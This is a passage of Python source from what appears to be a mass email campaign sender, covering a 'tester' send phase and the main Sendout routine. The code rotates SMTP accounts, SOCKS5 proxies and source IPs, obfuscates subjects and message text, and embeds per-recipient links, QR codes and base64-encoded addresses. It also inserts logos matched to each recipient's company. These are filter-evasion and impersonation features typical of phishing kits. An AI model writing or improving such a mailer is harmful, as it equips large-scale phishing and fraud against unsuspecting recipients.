    v3: the tester ORDER follows the multiple-SMTP rotation
    (smtp_config.selection_system): 1 = Cyclic (pool order), 2-5 = Random
    (mirrors select_smtp_entry). smtp_max limits are respected while
    assigning leads; leads that cannot be assigned stay unpinned and use the
    normal pool rotation for the campaign.

    Each lead is tested through its own tester's SMTP settings, and the same
    tester is pinned to that lead for the main campaign (the campaign loop
    reads test_send_assignments / test_send_testers). Host mode, EWS, OAuth2
    and shell transports have no per-entry SMTP pinning: their test phase
    keeps the normal internal pool rotation and the campaign is not pinned.

    Single-transport tester (v8.9): the tester letter is ALWAYS delivered
    through exactly ONE configured transport - the primary (first) mode of
    sending_mode (smtp, host, shell, ews, oauth2, ...) - so a lead can never
    receive the test letter twice. The main campaign keeps the full ordered
    failover chain. The old v3 fatal double-send guard (host + another
    transport stopped the whole sender and left the main campaign unreported)
    is gone; the phase now prints a notice and always continues.

    v6 pace (test_config.pace): 'auto' (default) derives the pace from each
    tester's own sending limit (smtp_max). A tester whose limit is unlimited
    (-1) runs '1by1' (test one lead, wait test_config.time, then send the main
    campaign to that same lead through the same tester SMTP, then move to the
    next lead). A tester with a numeric limit (100, 200, ...) runs 'group'
    (test all of that tester's leads, then the main campaign runs for them).
    'group' / '1by1' force the pace for every tester. The campaign loop skips
    leads already campaign-sent during the 1by1 phase (test_send_campaign_done).

    The routine is intentionally non-fatal: any failure is reported and the
    main campaign still runs (returns True).
    """
    global current_smtp_frommail, test_send_assignments, test_send_testers
    global test_send_campaign_done, test_send_attempted, test_send_sent, test_send_campaign_seen
    # v6 fix: snapshot the phase config once, at entry. The 1by1 pace calls
    # Sendout -> ensure_pdf_config_loaded -> load_sender_config ->
    # configure_optional_features, which re-reads setup.ini and resets the
    # runtime test_config globals (test_email_enabled, test_subject,
    # test_letter, test_letter_delay, test_time_unit, test_group_size,
    # test_pace, test_multiple). Re-reading those globals after the first
    # 1by1 lead would clobber this phase - e.g. test_email_enabled -> 0 makes
    # the next phase invocation print "Test phase is disabled" and skip, and
    # test_pace -> 'auto' would flip the remaining leads to a different pace.
    # Use one consistent snapshot for the whole phase instead.
    phase_email_enabled = test_email_enabled
    phase_subject = test_subject
    phase_letter_delay = test_letter_delay
    phase_time_unit = test_time_unit
    phase_group_size = test_group_size
    phase_pace = test_pace
    phase_multiple = test_multiple
    phase_tester_mode = tester_mode
    phase_tester_send_mode = tester_send_mode
    phase_tag = 'TESTER' if phase_tester_mode else 'TEST&SEND'
    test_send_campaign_done.clear()
    # v8.3: registry of addresses that got the tester letter during THIS run.
    # A tester&send lead is only deleted from leads.txt once it is in here AND
    # the main campaign has delivered to it.
    test_send_tested_run.clear()
    # v7/v8: skip already-processed leads. Reset the in-run sets and seed them
    # from the ledger so another tester SMTP in THIS run never re-attempts a
    # mailbox that was already tested or campaign-processed.
    # v8: unless test_config.ledger_persist is on, the ledger is wiped first, so
    # the dedupe only ever applies inside the current run - a finished run never
    # makes the next run skip leads ('already processed ...; skipped').
    test_send_campaign_seen.clear()
    if not test_send_ledger_persist:
        reset_test_send_ledger()
    try:
        _ledger_tested, _ledger_sent = load_test_send_ledger()
    except Exception:
        _ledger_tested, _ledger_sent = set(), set()
    if test_send_skip_processed:
        test_send_attempted.clear()
        test_send_attempted.update(_ledger_tested)
        test_send_sent.clear()
        test_send_sent.update(_ledger_sent)
        if _ledger_tested or _ledger_sent:
            print(f"{Fore.CYAN}[{phase_tag}] skip_processed: {len(_ledger_tested)} tested / {len(_ledger_sent)} campaign-processed address(es) carried over by ledger_persist will be skipped.{Style.RESET_ALL}", flush=True)
        else:
            print(f"{Fore.CYAN}[{phase_tag}] skip_processed: dedupe applies to THIS run only (ledger reset); a completed run never affects the next one.{Style.RESET_ALL}", flush=True)
    else:
        test_send_attempted.clear()
        test_send_sent.clear()
    # v6 pace (test_config.pace): 'auto' (default) derives the pace per tester
    # from its sending limit (smtp_max): unlimited (-1) -> 1by1, numeric ->
    # group. 'group' / '1by1' force the pace for every tester. Tester-only
    # mode (tester without tester&send) never runs the campaign, so it always
    # keeps the plain group pace.
    force_pace = phase_pace if phase_pace in ('group', '1by1') else None
    if phase_tester_mode and not phase_tester_send_mode:
        force_pace = 'group'
    pace_1by1_leads = 0
    pace_group_leads = 0
    try:
        modes = list(active_sending_modes or ['smtp'])
        mode_label = ' + '.join(MODE_DISPLAY.get(m, m.upper()) for m in modes)
        phase_label = transport_tester_label(modes[0]) if phase_tester_mode else 'test&send'

        if not (phase_email_enabled or phase_tester_mode):
            test_send_assignments = []
            test_send_testers = []
            print(f"{Fore.YELLOW}[{phase_tag}] Test phase is disabled (no 'test&send'/'tester'/'tester&send' token and test_config.enable is false); pre-campaign test phase skipped.{Style.RESET_ALL}", flush=True)
            return True

        # v8.9: the tester NEVER hard-stops and NEVER double-sends. Per the
        # tester&send contract ("the tester only uses testerletter, testersubject
        # and the one configured transport"), the test letter is delivered
        # through exactly ONE transport - the primary/first configured mode
        # (smtp, host, shell, ews, oauth2, ...) - while the main campaign keeps
        # the full ordered failover chain. This replaces the old v3 fatal guard
        # that stopped the whole sender on host + another transport and left the
        # main campaign unreported.
        test_phase_modes = modes[:1]
        primary_label = MODE_DISPLAY.get(modes[0], str(modes[0]).upper())
        if len(modes) >= 2:
            print(f"{Fore.YELLOW}[{phase_tag}] {len(modes)} sending modes active ({mode_label}); the tester letter uses{Style.RESET_ALL}", flush=True)
            print(f"{Fore.YELLOW}[{phase_tag}] the primary transport ({primary_label}) only, so a lead is never double-sent.{Style.RESET_ALL}", flush=True)
            print(f"{Fore.YELLOW}[{phase_tag}] The main campaign keeps the full failover chain ({mode_label}).{Style.RESET_ALL}", flush=True)

        # Build the tester pool. Only the multiple SMTP pool supports
        # per-tester pinning; host/EWS/OAuth2/shell keep internal rotation.
        testers = []
        if phase_multiple and use_random_smtp and smtp_pool_entries:
            testers = list(smtp_pool_entries)
        if testers:
            test_send_assignments, test_send_testers = plan_test_send_groups_v3(
                len(leads), phase_group_size, testers, smtp_selection_system)
        else:
            test_send_assignments = []
            test_send_testers = []
            testers = [{
                'smtp_server': smtpserv, 'smtp_port': port,
                'smtp_authy': its_authy, 'smtp_username': username,
                'smtp_password': password, 'smtp_fromemail': sender,
                'msg_fromemail': fromemail, 'smtp_secure': its_secure,
                'smtp_dangerous': False, '_synthetic': True,
            }]

        # v8.8: tester&send works on ANY active transport (smtp, host, shell,
        # ews, oauth2) - the test phase is mode-agnostic and the main campaign
        # follows through the same dispatch. A NORMAL (single) SMTP has no
        # tester pool, so its pace follows test_config.pace exactly like the
        # multiple-SMTP pool ('either grouped or 1by1'):
        #   group / auto -> the test letter goes to EVERY lead first, then the
        #     main campaign sends to every lead (auto maps to group for a single
        #     synthetic SMTP, the pre-campaign default).
        #   1by1 -> test one lead, wait, campaign that same lead through the
        #     same SMTP, then move to the next lead.
        # The invariant is unchanged in both paces: for every lead the tester
        # letter is sent BEFORE the main campaign. The 'tester' token forces
        # 'group' above and never runs the campaign. The MULTIPLE-SMTP pool
        # keeps its configured pace/rotation untouched ('still process normally').
        if not test_send_testers and not (phase_tester_mode and not phase_tester_send_mode):
            if force_pace == '1by1':
                unit_label = 'minute(s)' if phase_time_unit == 'min' else 'second(s)'
                print(f"{Fore.CYAN}[{phase_tag}] Normal (single) SMTP: pace = 1by1 - test one lead, wait {phase_letter_delay} {unit_label}, then the main campaign to that same lead, then the next lead.{Style.RESET_ALL}", flush=True)
            else:
                print(f"{Fore.CYAN}[{phase_tag}] Normal (single) SMTP: batch pace - the test letter goes to every lead first, then the main campaign sends to every lead.{Style.RESET_ALL}", flush=True)

        recipients = []
        seen = set()
        skipped_processed = 0
        for idx, lead in enumerate(leads or []):
            email = str(lead or '').strip()
            if not email:
                continue
            # v7: case/format-insensitive dedupe key (see _lead_key).
            key = _lead_key(email) or email.lower()
            if key in seen:
                continue
            seen.add(key)
            if test_send_skip_processed and key in test_send_attempted:
                skipped_processed += 1
                continue
            try:
                if not check(email):
                    continue
            except Exception:
                continue
            recipients.append((idx, email))

        if not recipients:
            test_send_assignments = []
            test_send_testers = []
            print(f"{Fore.YELLOW}[{phase_tag}] No valid leads to test; pre-campaign test phase skipped.{Style.RESET_ALL}", flush=True)
            return True

        body, body_path = _load_test_letter_body()
        message_type = 'html'
        try:
            message_type = str(config.get('OPTION', 'mstype', fallback='html') or 'html').strip().lower()
        except Exception:
            message_type = 'html'
        subtype = 'plain' if message_type == 'plain' else 'html'

        print(f"\n{Fore.CYAN}{'=' * 62}{Style.RESET_ALL}", flush=True)
        print(f"{Fore.CYAN}[{phase_tag}] Pre-campaign test phase: {len(recipients)} lead(s) via {phase_label}{Style.RESET_ALL}", flush=True)
        if body_path:
            print(f"{Fore.CYAN}[{phase_tag}] Test letter: {body_path}{Style.RESET_ALL}", flush=True)
        if str(test_fromname or '').strip():
            print(f"{Fore.CYAN}[{phase_tag}] testerfromname is set: tester letters use the dedicated From name ({str(test_fromname).strip()}); the campaign fromname stays untouched.{Style.RESET_ALL}", flush=True)
        if phase_multiple and test_send_testers:
            print(f"{Fore.CYAN}[{phase_tag}] enable_multiple is on: {len(test_send_testers)} SMTP tester(s) own the leads in groups.{Style.RESET_ALL}", flush=True)
            if int(smtp_selection_system or 1) == 1:
                rotation_label = 'Cyclic (selection_system 1)'
            else:
                rotation_label = 'Random (selection_system {})'.format(int(smtp_selection_system or 1))
            print(f"{Fore.CYAN}[{phase_tag}] Tester rotation: {rotation_label} (same as the multiple-SMTP rotation).{Style.RESET_ALL}", flush=True)
            if phase_group_size and phase_group_size > 0:
                print(f"{Fore.CYAN}[{phase_tag}] group_size = {phase_group_size}: chunks of {phase_group_size} lead(s) per tester (round-robin).{Style.RESET_ALL}", flush=True)
            elif any(_entry_smtp_max(e) >= 0 for e in test_send_testers):
                print(f"{Fore.CYAN}[{phase_tag}] group_size = 0: sending_limit-driven sizing - each tester owns up to its smtp_max lead(s); unlimited testers share the rest.{Style.RESET_ALL}", flush=True)
            else:
                print(f"{Fore.CYAN}[{phase_tag}] group_size = 0: leads split evenly across the testers.{Style.RESET_ALL}", flush=True)
            if force_pace == '1by1':
                unit_label = 'minute(s)' if phase_time_unit == 'min' else 'second(s)'
                print(f"{Fore.CYAN}[{phase_tag}] pace = 1by1 (forced): test one lead, wait {phase_letter_delay} {unit_label}, then send the main campaign to that same lead via the same tester SMTP.{Style.RESET_ALL}", flush=True)
            elif force_pace == 'group':
                print(f"{Fore.CYAN}[{phase_tag}] pace = group (forced): test all leads, wait, then run the main campaign for all leads.{Style.RESET_ALL}", flush=True)
            else:
                unlimited_n = sum(1 for e in test_send_testers if _entry_smtp_max(e) < 0)
                limited_n = len(test_send_testers) - unlimited_n
                unit_label = 'minute(s)' if phase_time_unit == 'min' else 'second(s)'
                print(f"{Fore.CYAN}[{phase_tag}] pace = auto (sending_limit driven): {unlimited_n} unlimited tester(s) -> 1by1 (test one lead, wait {phase_letter_delay} {unit_label}, then the main campaign to that same lead), {limited_n} limited tester(s) -> group (test the whole group first, then the main campaign).{Style.RESET_ALL}", flush=True)
        elif phase_multiple:
            print(f"{Fore.CYAN}[{phase_tag}] enable_multiple is on: rotating active-mode settings for the test send.{Style.RESET_ALL}", flush=True)
        print(f"{Fore.CYAN}{'=' * 62}{Style.RESET_ALL}", flush=True)

        if test_send_skip_processed:
            print(f"{Fore.CYAN}[{phase_tag}] skip_processed is on: {len(test_send_attempted)} address(es) carried over; {skipped_processed} lead(s) skipped in this phase.{Style.RESET_ALL}", flush=True)

        test_sent = 0
        test_failed = 0

        for line_idx, email in recipients:
            entry = None
            try:
                current_smtp_frommail = str(fromemail or '').strip()

                # Resolve this lead's tester (pinned SMTP entry) when groups exist.
                entry = None
                if test_send_assignments and test_send_testers and line_idx < len(test_send_assignments):
                    t_idx = test_send_assignments[line_idx]
                    if t_idx is not None and t_idx < len(test_send_testers):
                        entry = test_send_testers[t_idx]
                if entry is not None:
                    eff_smtpserv = entry.get('smtp_server', smtpserv)
                    eff_port = entry.get('smtp_port', port)
                    eff_authy = entry.get('smtp_authy', its_authy)
                    eff_user = entry.get('smtp_username', username)
                    eff_pass = entry.get('smtp_password', password)
                    eff_sender = entry.get('smtp_fromemail', sender)
                    eff_secure = entry.get('smtp_secure', its_secure)
                else:
                    eff_smtpserv, eff_port = smtpserv, port
                    eff_authy, eff_user = its_authy, username
                    eff_pass, eff_sender, eff_secure = password, sender, its_secure

                subject_text = _load_test_subject(phase_subject)
                if subject_text:
                    subject_text = replace_placeholders(email, subject_text)
                else:
                    try:
                        subject_text = get_rotating_subject() or 'Test Message'
                    except Exception:
                        subject_text = 'Test Message'
                try:
                    subject_text = apply_subject_encryption(subject_text)
                except Exception:
                    pass

                body_text = replace_placeholders(email, body) if body else ''

                # v8.4: test_config.testerfromname - dedicated tester From name.
                # {smtpfrommail}/{SMTPFROMMAIL} resolve to the acting tester
                # SMTP's from-mail; empty config keeps the campaign fromname.
                tester_fromname_override = ''
                try:
                    tester_fromname_override = _resolve_tester_fromname(
                        email, test_fromname, entry, sender, fromemail)
                except Exception:
                    tester_fromname_override = ''
                default_name = ''
                try:
                    default_name = fromname_setup.get('fromName') or ''
                except Exception:
                    default_name = ''
                try:
                    selected_fromemail, sname, envelope_sender = resolve_sender_identity(
                        email, fromemail, sender, default_name,
                        fromname_override=tester_fromname_override)
                except Exception:
                    selected_fromemail, sname, envelope_sender = fromemail, '', sender

                msg = MIMEMultipart('alternative')
                msg['Subject'] = Header(str(subject_text), 'utf-8')
                if sname:
                    msg['From'] = formataddr((str(sname), str(selected_fromemail)))
                else:
                    msg['From'] = str(selected_fromemail)
                msg['To'] = email
                try:
                    apply_custom_headers(msg, recipient_email=email)
                except Exception:
                    pass
                msg.attach(MIMEText(body_text, subtype, 'utf-8'))

                # v8.9: the tester letter goes through exactly ONE configured
                # transport (the primary mode), never the whole failover chain -
                # 'the tester only uses ... the host details e.g smtp,shell,host
                # etc any ONE configured with the tester&send'.
                result = deliver_message([email], envelope_sender, msg.as_string(),
                                         eff_smtpserv, int(eff_port), eff_authy,
                                         eff_user, eff_pass, eff_secure,
                                         modes_override=test_phase_modes)
                if result:
                    test_sent += 1
                    # v8.3: remember this address got the tester letter this run.
                    try:
                        _tk = _lead_key(email) or str(email or '').strip().lower()
                        if _tk:
                            test_send_tested_run.add(_tk)
                    except Exception:
                        pass
                    print(f"{Fore.GREEN}[{phase_tag}] Test delivered to {email}{Style.RESET_ALL}", flush=True)
                else:
                    test_failed += 1
                    print(f"{Fore.RED}[{phase_tag}] Test failed for {email}{Style.RESET_ALL}", flush=True)
            except Exception as exc:
                test_failed += 1
                print(f"{Fore.YELLOW}[{phase_tag}] Test error for {email}: {exc}{Style.RESET_ALL}", flush=True)

            # v7: mark this lead as tested in the persistent ledger so a re-run
            # (or another tester SMTP) never re-tests it.
            record_test_send_ledger('tested', email)

            # v6: resolve this lead's pace. 'auto' derives it from the pinned
            # tester's sending limit (unlimited -1 -> 1by1, numeric -> group).
            lead_pace = force_pace or _entry_pace(entry, phase_pace)
            if lead_pace == 'group':
                pace_group_leads += 1
            if lead_pace == '1by1':
                # v6 1by1 pace: wait the configured time, then send the main
                # campaign to this same lead through the same tester SMTP.
                pace_1by1_leads += 1
                delay = test_delay_seconds(phase_letter_delay, phase_time_unit)
                if delay > 0:
                    unit_label = 'minute(s)' if phase_time_unit == 'min' else 'second(s)'
                    print(f"{Fore.CYAN}[{phase_tag}] 1by1 pace: waiting {phase_letter_delay} {unit_label} ({delay}s) before the main campaign send to {email}...{Style.RESET_ALL}", flush=True)
                    slept = 0
                    while slept < delay:
                        time.sleep(min(1.0, delay - slept))
                        slept += 1
                try:
                    if entry is not None:
                        c_smtpserv = entry.get('smtp_server', smtpserv)
                        c_port = int(entry.get('smtp_port', port))
                        c_authy = entry.get('smtp_authy', its_authy)
                        c_user = entry.get('smtp_username', username)
                        c_pass = entry.get('smtp_password', password)
                        c_frommail = entry.get('msg_fromemail', fromemail)
                        c_sender = entry.get('smtp_fromemail', sender)
                        c_secure = entry.get('smtp_secure', its_secure)
                        c_dangerous = entry.get('smtp_dangerous', False)
                    else:
                        c_smtpserv, c_port = smtpserv, int(port)
                        c_authy, c_user = its_authy, username
                        c_pass, c_sender = password, sender
                        c_frommail, c_secure = fromemail, its_secure
                        c_dangerous = False
                    _camp_ok = False
                    try:
                        _camp_ok = bool(Sendout(email, c_smtpserv, c_port, c_authy, c_user, c_pass,
                                                c_frommail, c_sender, c_secure,
                                                line_number=line_idx + 1,
                                                smtp_dangerous_override=c_dangerous))
                    except Exception as exc:
                        _camp_ok = False
                        print(f"{Fore.YELLOW}[{phase_tag}] 1by1 pace: main campaign send error for {email}: {exc}{Style.RESET_ALL}", flush=True)
                    if _camp_ok:
                        test_send_campaign_done.add(line_idx + 1)
                        print(f"{Fore.GREEN}[{phase_tag}] 1by1 pace: main campaign sent to {email} via the same tester SMTP.{Style.RESET_ALL}", flush=True)
                        # v8.3: delete_config - the 1by1 campaign send IS this lead's
                        # main campaign, so remove it once fully processed (tester +
                        # campaign both done). Non-fatal.
                        try:
                            delete_processed_lead(email)
                        except Exception:
                            pass
                    else:
                        print(f"{Fore.YELLOW}[{phase_tag}] 1by1 pace: main campaign send FAILED for {email}; the lead stays in leads.txt and the main campaign loop will retry it.{Style.RESET_ALL}", flush=True)
                except Exception as exc:
                    print(f"{Fore.YELLOW}[{phase_tag}] 1by1 pace: main campaign send error for {email}: {exc}{Style.RESET_ALL}", flush=True)

        print(f"{Fore.CYAN}[{phase_tag}] Test phase complete: {test_sent} delivered, {test_failed} failed.{Style.RESET_ALL}", flush=True)
        if phase_tester_mode and not phase_tester_send_mode:
            print(f"{Fore.GREEN}[{phase_tag}] Tester mode complete: the main campaign will NOT run (the 'tester' token runs the tester only).{Style.RESET_ALL}", flush=True)
            return True
        if pace_1by1_leads and not pace_group_leads:
            print(f"{Fore.CYAN}[{phase_tag}] 1by1 pace complete: every lead was tested, waited, and campaign-sent individually; the campaign loop will skip the leads that were sent successfully (failed ones are retried).{Style.RESET_ALL}", flush=True)
            return True
        if pace_1by1_leads:
            print(f"{Fore.CYAN}[{phase_tag}] Mixed pace: {pace_1by1_leads} lead(s) were campaign-sent 1by1 during the test phase; {pace_group_leads} lead(s) keep the group pace and run in the main campaign.{Style.RESET_ALL}", flush=True)
        delay = test_delay_seconds(phase_letter_delay, phase_time_unit)
        if delay > 0:
            unit_label = 'minute(s)' if phase_time_unit == 'min' else 'second(s)'
            print(f"{Fore.CYAN}[{phase_tag}] Waiting {phase_letter_delay} {unit_label} ({delay}s) before the main campaign starts...{Style.RESET_ALL}", flush=True)
            slept = 0
            while slept < delay:
                time.sleep(min(1.0, delay - slept))
                slept += 1
        else:
            print(f"{Fore.CYAN}[{phase_tag}] Main campaign starts now.{Style.RESET_ALL}", flush=True)
        return True
    except Exception as exc:
        test_send_assignments = []
        test_send_testers = []
        print(f"{Fore.YELLOW}[{phase_tag}] Pre-campaign test phase skipped due to error: {exc}{Style.RESET_ALL}", flush=True)
        return True


def ensure_pdf_config_loaded():
    """Recover PDF settings if the main startup config pass skipped them.

    Reads the parsed config without re-applying it to the runtime state:
    Sendout() calls this on every send, and a runtime re-apply
    (configure_optional_features / load_sending_modes) would reset the
    test_config globals mid-run and clobber an in-progress test&send phase.
    """
    if pdf_setup.get('enable', 0) == 1 and pdf_setup.get('location'):
        return
    try:
        cfg = load_sender_config('setup.ini', apply_runtime=False)
        if not cfg.has_section('pdf'):
            return
        pdf_setup['enable'] = 1 if cfg_get_bool(cfg, 'pdf', 'enable', False) else 0
        pdf_setup['location'] = cfg.get('pdf', 'location', fallback='PDF/pdf.html').strip()
        pdf_setup['name'] = cfg.get('pdf', 'name', fallback='document.pdf').strip()
        pdf_setup['layout'] = cfg.getint('pdf', 'layout', fallback=1)
        pdf_setup['page_type'] = cfg.getint('pdf', 'page_type', fallback=1)
        pdf_setup['margin'] = cfg.getfloat('pdf', 'margin', fallback=0.4)
        pdf_setup['password_protection'] = 1 if cfg_get_bool(cfg, 'pdf', 'password_protection', False) else 0
        pdf_setup['password'] = cfg.get('pdf', 'password', fallback='')
        pdf_setup['zip_it'] = 1 if cfg_get_bool(cfg, 'pdf', 'zip_it', False) else 0
    except Exception as exc:
        print(f"{Fore.YELLOW}[PDF] Could not load html_pdf_config: {exc}{Style.RESET_ALL}")

def resolve_sender_identity(email, default_frommail, sender, default_name, header_profile=None, fromname_override=None):
    """Resolve the effective From address and display name for a recipient.

    Host mode still supports a static frommail/fromname when no rotation is enabled,
    but it must not override active multiple frommail/fromname rotation settings.
    v8.4: a non-empty fromname_override wins over every fromname source
    (custom header profile, fromname_setup, rotation, host mode); it is used
    only by the tester letters so the campaign From name stays untouched.
    """
    try:
        selected_header_profile = header_profile or get_custom_header_profile()
        global frommail_list, frommail_index, fromname_list, fromname_index
        selected_fromemail = normalize_sender_address(default_frommail, sender)
        if frommail_setup.get('enableMultiple') and frommail_list:
            selected_fromemail, frommail_index = pick_rotation_entry(
                frommail_list, frommail_index,
                frommail_setup.get('selection_system', 1))
        selected_fromemail = findString(email, selected_fromemail)

        if fromname_setup.get('enableMultiple') and not fromname_list:
            fromname_path = resolve_config_file(fromname_setup.get('fromnameList'), 'MULTIPLE/from_name.txt')
            fromname_list = load_simple_list(fromname_path)
            fromname_index = 0
        if fromname_override:
            # v8.4: tester fromname takes precedence over profile/rotation/defaults.
            selected_name = str(fromname_override)
        else:
            selected_name = get_profile_value(selected_header_profile, 'fromname') or (fromname_setup.get('fromName') or default_name)
            if fromname_setup.get('enableMultiple') and fromname_list:
                with fromname_rotation_lock:
                    selected_name, fromname_index = pick_rotation_entry(
                        fromname_list, fromname_index,
                        fromname_setup.get('selection_system', 1))
        sname = findString(email, selected_name)
        envelope_sender = findString(email, sender)

        if vdm_host_mode and vdm_frommail and not frommail_setup.get('enableMultiple'):
            host_frommail = findString(email, vdm_frommail).strip()
            if host_frommail:
                selected_fromemail = host_frommail
                envelope_sender = host_frommail
        if vdm_host_mode and vdm_fromname and not fromname_setup.get('enableMultiple') and not fromname_override:
            custom_fromname = get_profile_value(selected_header_profile, 'fromname') if custom_headers_enabled else None
            if not custom_fromname:
                sname = findString(email, vdm_fromname).strip()
        return selected_fromemail, sname, envelope_sender
    except Exception:
        sname = findString(email, fromname_override or default_name)
        selected_fromemail = normalize_sender_address(default_frommail, sender)
        envelope_sender = findString(email, sender)
        return selected_fromemail, sname, envelope_sender


def Sendout(emails, smtpserv, port, its_authy, username, password, fromemail, sender, its_secure, line_number=None, bind_ip=None, source_file=None, proxy=None, smtp_dangerous_override=None):
    # Note: legacy calls may not pass source_file; handled via dmailer updated signature
    global current_smtp_frommail
    global texto, subject, name, sfile, link, loadsmtp, success_sent_count, failed_sent_count
    _send_succeeded = False
    current_smtp_frommail = str(normalize_sender_address(sender, fromemail or '') or fromemail or '').strip()
    _functions.set_current_smtp_frommail(current_smtp_frommail)
    ensure_pdf_config_loaded()
    delivery_recipients = [emails]
    if bcc_enabled:
        delivery_recipients.extend(get_next_bcc_batch(bcc_limit))
    fromemail = GetFromEmail(fromemail)
    # Resolve outbound route: SOCKS5 proxy (per-recipient rotation) takes
    # precedence over the source-IP rotation; warn when both are configured.
    if proxy is None:
        proxy = get_next_proxy()
    if proxy is not None:
        if bind_ip:
            print(f"{Fore.YELLOW}[WARN] Both proxies_config and ip_config rotation are active - using SOCKS5 proxy and ignoring source IP {bind_ip}{Style.RESET_ALL}", flush=True)
            bind_ip = None
    elif bind_ip is None:
        bind_ip = get_next_bind_ip()
    if bind_ip:
        print(f'[ o ] Using source IP: {bind_ip}', flush=True)
    if proxy:
        proxy_label = f"{proxy.get('host')}:{proxy.get('port')}"
        print(f"[ o ] Using SOCKS5 proxy: {proxy_label}", flush=True)
    if smtpserv:
        smtpserv_lower = smtpserv.strip().lower()
        if smtpserv_lower == 'mail.protection.outlook.com':
            smtpserv = build_smtp_host_for_recipient(emails, smtpserv)
            print(f"{Fore.YELLOW}[TRACE] Rewrote generic Outlook SMTP host to recipient-specific host: {smtpserv}{Style.RESET_ALL}")
        elif smtpserv_lower.endswith('.mail.protection.outlook.com'):
            print(f"{Fore.YELLOW}[TRACE] Using configured Outlook protection SMTP host: {smtpserv}{Style.RESET_ALL}")
    nlink = BindLink(emails,link)
    # If multiple letters rotation enabled, pick next letter for this recipient
    if letter_setup.get('enableMultiple', 0) == 1 and letter_list:
        try:
            global letter_index
            with letter_lock:
                chosen, letter_index = pick_rotation_entry(
                    letter_list, letter_index,
                    letter_setup.get('selection_system', 1))
            chosen = chosen or letter_list[0]
            # Log which letter we're using for this recipient
            try:
                print(f"{Fore.CYAN}[LETTER] Using {chosen} for recipient {emails}{Style.RESET_ALL}")
            except Exception:
                pass
            try:
                texto_local = codecs.open(chosen, 'r', 'utf8').read()
            except Exception:
                texto_local = texto
            nmsg = findString(emails, texto_local, skip_link=True)
        except Exception:
            nmsg = findString(emails, texto, skip_link=True)
    else:
        nmsg = findString(emails,texto, skip_link=True)
    nmsg = nmsg.replace("{link}", nlink)
    nmsg = nmsg.replace("{LINK}", nlink)
    nmsg = nmsg.replace("{Link}", nlink)
    nmsg = nmsg.replace("[link]", nlink)
    nmsg = nmsg.replace("[LINK]", nlink)
    nmsg = nmsg.replace("[Link]", nlink)
    message_link_urls = {1: nlink}
    nmsg = _replace_link_placeholders(nmsg, emails, message_link_urls)
    # support EMAIL64 placeholder
    nmsg = nmsg.replace("{EMAIL64}", base64encode(emails))
    if int(letter_setup.get('enableEncryption', 0) or 0) == 1:
        nmsg = apply_letter_encryption(nmsg)
    nmsg = apply_word_encryption(nmsg)
    nmsg = _resolve_local_image_tokens(nmsg)
    nmsg = _normalize_encoded_tokens(nmsg)
    qrcode_cid = None
    # Handle QR code embedding based on config flag `useqrcode`.
    try:
        if use_qrcode:
            qr_tokens = ('{qrcode}', '{QRCODE}')
            if any(token in nmsg for token in qr_tokens):
                qrcode_cid = "qrcode.png"
                replacement = _render_qr_html(
                    'cid:' + qrcode_cid,
                    nlink,
                    bool(qrcode_setup.get('hideQrCode', 0)),
                )
                for token in qr_tokens:
                    nmsg = nmsg.replace('src="' + token + '"', 'src="cid:' + qrcode_cid + '"')
                    nmsg = nmsg.replace("src='" + token + "'", 'src="cid:' + qrcode_cid + '"')
                    nmsg = nmsg.replace(token, replacement)
            else:
                qrcode_cid = None
        else:
            # remove any placeholder if present and do not generate/attach QR image
            nmsg = nmsg.replace("{qrcode}", "").replace("{QRCODE}", "")
            qrcode_cid = None
    except NameError:
        # fallback if config parsing didn't set use_qrcode
        nmsg = nmsg.replace("{qrcode}", "").replace("{QRCODE}", "")
        qrcode_cid = None
    src_imgs = []

    #nmsg = nmsg.replace('{image}', GetBanner(emails,link))
    
    # If {logo} placeholder present, attempt to fetch company logo and insert inline image
    try:
        if not logo_setup.get('enable', 0):
            nmsg = nmsg.replace('{LOGO}', '').replace('{logo}', '').replace('{logos}', '')
        elif '{LOGO}' in nmsg:
            logo_path = get_configured_logo_path()
            if logo_path:
                img_cid = os.path.basename(logo_path)
                nmsg = nmsg.replace('{LOGO}', f'<img src="cid:{img_cid}" alt="logo" />')
                src_imgs.append(logo_path)
            else:
                nmsg = nmsg.replace('{LOGO}', '')
        if '{logo}' in nmsg:
            logo_path = None
            try:
                logo_path = get_logo_for_email(emails)
            except Exception:
                logo_path = None
            if logo_path:
                img_cid = os.path.basename(logo_path)
                # Replace placeholder with cid reference and ensure file is attached later
                nmsg = nmsg.replace('{logo}', f'<img src="cid:{img_cid}" alt="logo" />')
                try:
                    src_imgs.append(logo_path)
                    try:
                        print(f"{Fore.CYAN}[LOGO] Using logo {img_cid} for recipient {emails}{Style.RESET_ALL}")
                    except Exception:
                        pass
                except Exception:
                    pass
            else:
                nmsg = nmsg.replace('{logo}', '')
    except Exception:
        pass

    # If {logos} placeholder present, pick a random local logo and insert inline image
    try:
        if '{logos}' in nmsg:
            logo_path = None
            try:
                logo_path = get_logo_for_company(_functions.get_current_company_email())
                if not logo_path:
                    logo_path = get_random_logo()
            except Exception:
                logo_path = None
            if logo_path:
                img_cid = os.path.basename(logo_path)
                # Replace placeholder with cid reference and ensure file is attached later
                nmsg = nmsg.replace('{logos}', '<img src="cid:' + img_cid + '" alt="logo" />')
                try:
                    src_imgs.append(logo_path)
                    try:
                        print(f"{Fore.CYAN}[LOGO] Using random logo {img_cid} for recipient {emails}{Style.RESET_ALL}")
                    except Exception:
                        pass
                except Exception:
                    pass
            else:
                nmsg = nmsg.replace('{logos}', '')
    except Exception:
        pass

    # v9.2: sender_config.inline_images=true -> persist base64 data URIs as
    # real files so the CID/inline pipeline attaches them (providers that
    # strip data: URIs still render the image). Also never let the CID rewrite
    # mangle a raw data: URI when the setting is off.
    if inline_images_enabled and 'data:image/' in nmsg:
        try:
            nmsg = _materialize_data_uri_images(nmsg)
        except Exception:
            pass

    imgs = blowimgsrc(nmsg)
    for img in imgs:
        if str(img).lower().startswith('data:'):
            # Leave inline base64 images untouched; the CID rewrite below would
            # otherwise corrupt the data URI.
            continue
        if img.lower().startswith('cid:'):
            img_src = str(img.lower().split(":", 1)[-1])
            #nmsg = nmsg.replace(img, "cid:"+os.path.basename(img_src))
            #src_imgs.append(img_src)
            #print(img_src)

            if img_src.lower().startswith('http'):
                img_src_path = download_image_to_logopics(img_src)
                if not img_src_path:
                    nmsg = nmsg.replace(img, "")
                    continue
                img_filename = os.path.basename(img_src_path)
                img_src = img_src_path
                nmsg = nmsg.replace(img, "cid:"+img_filename)
                src_imgs.append(img_src)
            elif img_src.lower().startswith('{image}'):
                img_src = GetBanner(emails,link)
                img_filename = os.path.basename(img_src)
                img_src_path = "LOGO_PICS/"+img_filename
                img_src = img_src_path
